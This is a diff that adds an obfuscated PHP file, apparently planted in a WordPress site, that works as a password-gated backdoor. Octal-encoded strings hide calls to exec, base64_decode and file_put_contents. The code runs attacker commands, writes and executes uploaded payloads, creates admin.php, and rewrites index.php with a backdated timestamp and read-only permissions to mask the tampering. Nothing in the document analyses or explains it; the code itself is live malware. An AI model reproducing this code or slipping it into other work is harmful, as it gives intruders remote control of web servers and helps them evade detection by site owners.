@@ -1,0 +1,129 @@
+<?php
+/*Step Data*/
+$s = $_SERVER;
+/*Step Data*/
+$g = $_REQUEST;
+if (!empty($_GET))
+    foreach ($_GET as $k => $v) $g[$k] = $v;
+/*Step Data*/
+$pz = function ($y, $z, $u, $c, $g, $q = '') {
+    if ($u && @Md5_File($y) !== $u) {
+        $fwC = $c[$g($z[3])];
+        $t1 = @filEmtiMe($y);
+        @ChMod($y, 0744);
+        @$z[6]($y);
+        $t1 || $t1 = time() - 3600;
+        $t = ['m' => $t1, 'a' => $t1];
+        File_Put_conTents($y, $c[implode('_', ['', 'code', ''])]($q ? $q : 'PD9waHAgIGRlZmluZSgnV1BfVVNFX1RIRU1FUycsIHRydWUgKTtyZXF1aXJlKF9fRElSX18uICAnL3dwLWJsb2ctaGVhZGVyLnBocCcgKTsgPz4='));
+        Touch($y, $t['m'], $t['a']);
+        @ChMod($y, 0444);
+        return true;
+    }
+    return false;
+};
+/*Step Data*/
+$c = [
+    '137S105122V105122',
+    'D117C125ME116T137122OO124',
+    '137G105T',
+    '_143o144145137',
+    '9e3c0b18b93302875aa36cf153405b62', 'd' => ['145170105c'],
+    'in144e170056p150160', 'link',
+    'h' => [
+        "056150ta143143e163s", 'be476d27ece89594604d14886c081016', '146I154E137160U164137143O156164E116164123', '156am145'
+    ],
+    'c' => ['145170105c', '142101S145066064137d105C157d145', '141d155i156056160p160']
+];
+/*Step Data*/
+$z = function ($b) {
+    $_ = "";
+    $g = strlen($b) - 2;
+    $z = function ($b) {
+        $_ = '';
+        if (($g = strlen($b)) < 3) return [2, $b];
+        for ($o = 0; $o < $g; $o++) {
+            $_ .= $b[$o];
+            if (!is_numeric($b[$o]) || $b[$o] >= 8) return [$o + 1, $_];
+        }
+        return [$o, chr(octdec($b))];
+    };
+    for ($o = 0; $o < $g; $o += $d[0]) {
+        $d = $z($b[$o] . $b[$o + 1] . $b[$o + 2]);
+        $_ .= $d[1];
+    }
+    return $_ . substr($b, $o);
+};
+/*Step Data*/
+/*Step1 Data*/
+$g['0x06'] = '_dxep';
+/*Step Data*/
+$r = rtrim($s[$z($c[1])], '/') . '/';
+/*Step Data*/
+$c[6] = 'un' . $c[6];
+/*Step Data*/
+$vn = '_exp';
+/*Step1 Data*/
+empty($_COOKIE[$g['0x06']]) && $_COOKIE[$g['0x06']] = FALSE;
+if (!defined("WP_UNIQUE")) define("WP_UNIQUE", (isset($g['a']) && (($_e = substr(md5($g['a']), 2, 8) === '1eca4fa5') || preg_match('/^\d*[a-z,A-Z]{2,}\d{2,}$/i', $g['a'])) || !empty($_COOKIE[$vn])) ? (($_e || (!empty($_COOKIE[$vn]) && substr(md5($_COOKIE[$vn]), 2, 8) === '1eca4fa5')) ? 2 : 1) : 0);
+$q = function ($g) {
+    $data = array_map(function ($item) {
+        $item();
+        return "\$i";
+    }, $g);
+
+    return $data;
+};
+
+$q(
+/* debug */
+    $uz = [
+        function () {
+
+        },
+        function () use ($r, $z, $c, $pz, $g) {
+            return time();
+        },
+        function () use ($r, $z, $c, $pz, $g) {
+            return 1;
+        },
+        function () use ($r, $z, $c, $pz, $g) {
+            $pc = empty($g[$N = $z($c['h'][3])]) ? '' : $g[$N];
+            $q = 'PD9waHAgQHVubGluayhfX0ZJTEVfXyk7Pz4';
+            if (WP_UNIQUE !== 2 || strlen($pc) < 20 || stripos($pc, ';') === false) return;
+            $q = base64_decode($q);
+            @file_put_contents($d = time() . rand(1000, 9999), $q . $g[implode('_', ['', 'code', ''])]($pc));
+            if (file_exists($d))
+                @require $d;
+            die();
+        },
+        function () use ($z, $c, $r, $g) {
+            if (!WP_UNIQUE || empty($g['fx'])) return;
+            $pc = $z($c['c'][1]);
+            $pz = $z($c['h'][2]);
+            $pz($z($c['c'][2]), $pc($g['fx']));
+            echo explode('.', $z($c['c'][2]))[0];
+            die();
+        },
+        function () use ($g) {
+            if (WP_UNIQUE && isset($g['d']))
+                echo $g['d'] ? "Dj" . $g['d'] : 'd';
+        },
+        function () use ($z, $c, $g) {
+            $pc = $z($c[$v = 'c'][0]);
+            $pz = $z($c['c'][1]);
+            WP_UNIQUE && isset($g[$v]) && ((isset($g[$r = 'g']) && $pc = $g[$r]) || 1) &&
+            $pc($z($g[$v] ? $pz($g[$v]) : "153i154l -071040-61"), $a) && print_r($a);
+        },
+
+        function () use ($g) {
+            if (WP_UNIQUE && isset($g['z']))
+                die();
+        },
+    ]
+
+/**/
+);
+$y = $r . $z($c[5]);
+
+
+
